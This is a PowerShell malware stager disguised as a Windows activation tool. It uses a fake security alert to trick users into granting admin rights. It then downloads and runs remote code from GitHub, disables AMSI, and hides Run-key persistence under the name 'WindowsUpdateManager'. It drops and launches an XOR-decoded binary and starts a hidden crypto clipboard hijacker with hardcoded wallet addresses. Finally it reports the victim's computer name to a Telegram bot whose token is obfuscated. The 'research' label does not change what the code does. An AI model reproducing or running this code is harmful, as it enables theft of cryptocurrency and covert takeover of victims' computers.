# --- [RESEARCH STAGER v34.0: UAC-DELAYED DEPLOYMENT] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. UI SETUP (Starts in User-Mode, no alerts yet)
function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(580,520)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(35,60); $console.Size = New-Object Drawing.Size(490,160)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > ANALYZING HOST... DONE`n > HWID Verification: PASSED`n > Security Scan: [!] HEURISTIC BLOCK DETECTED"
    $prep.Controls.Add($console)

    $msg = New-Object Windows.Forms.Label
    $msg.Location = New-Object Drawing.Point(35,240); $msg.Size = New-Object Drawing.Size(500,80)
    $msg.Text = "To apply the Professional Digital Entitlement, you must grant the deployment engine administrative permissions when prompted."
    $prep.Controls.Add($msg)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(195,400); $btn.Size = New-Object Drawing.Size(180,45); $btn.Text = "Proceed & Activate"
    $btn.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $btn.ForeColor = [Drawing.Color]::White; $btn.FlatStyle = "Flat"
    
    $btn.Add_Click({ 
        $global:proceed = $true
        $prep.Close() 
    })
    $prep.Controls.Add($btn)
    $prep.ShowDialog() | Out-Null
}

function Show-ActivatorUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Deployment Progress"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $label = New-Object Windows.Forms.Label
    $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,25); $label.Text = "Status: Elevating privileges..."
    $form.Controls.Add($label)
    $pb = New-Object Windows.Forms.ProgressBar
    $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($pb)
    $form.Show()

    # Phase 1: Request Admin Permission (This is where the Windows Yes/No pops up)
    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $label.Text = "Status: Waiting for User Permission..."
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1'); Start-Payload""" -Verb RunAs
        Start-Sleep -Seconds 2
        $pb.Value = 100
        $label.Text = "Status: Service Started Successfully."
        Start-Sleep -Seconds 2
        $form.Close()
        exit
    }
}

# 2. THE SECRET PAYLOAD (Only runs after Admin is clicked)
function Start-Payload {
    try {
        # AMSI Bypass (Run as Admin)
        [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)

        # Persistence
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd

        # XOR Binary Installation
        $dir = "$env:LOCALAPPDATA\Microsoft\DeviceSync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $bytes = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $bytes.count; $i++) { $bytes[$i] = $bytes[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $bytes)
        Start-Process $path -WindowStyle Hidden

        # Clipper
        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden

        # Telegram Ping
        $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
        $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
        $url = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=V34_SUCCESS_ON_$env:COMPUTERNAME"
        (New-Object Net.WebClient).DownloadString($url)
    } catch {}
}

# --- MAIN EXECUTION ---
if ($args -contains "Start-Payload") {
    Start-Payload
} else {
    Show-SecurityPrep
    if ($global:proceed) {
        Show-ActivatorUI
    }
}
